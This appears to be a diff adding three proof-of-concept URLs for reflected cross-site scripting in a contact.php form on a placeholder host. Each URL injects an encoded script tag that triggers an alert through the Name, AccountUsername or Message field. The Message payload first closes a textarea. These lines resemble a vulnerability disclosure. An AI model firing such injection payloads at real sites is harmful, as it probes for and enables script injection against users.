@@ -1,0 +1,4 @@
+http://www.example.com/contact.php?action=submit&amp;Name=&#039;&gt;&lt;script&gt;alert(&#039;XSS Vulnerability&#039;)%3B&lt;/script&gt;&amp;EmailAddress=1&amp;AccountUsername=1&amp;Message=1
+http://www.example.com/contact.php?action=submit&amp;Name=1&amp;EmailAddress=1&amp;AccountUsername=&#039;&gt;&lt;script&gt;alert(&#039;XSS Vulnerability&#039;)%3B&lt;/script&gt;&amp;Message=1
+http://www.example.com/contact.php?action=submit&amp;Name=1&amp;EmailAddress=1&amp;AccountUsername=1&amp;Message=&lt;/textarea&gt;&lt;script&gt;alert(&#039;XSS Vulnerability&#039;)%3B&lt;/script&gt;
+
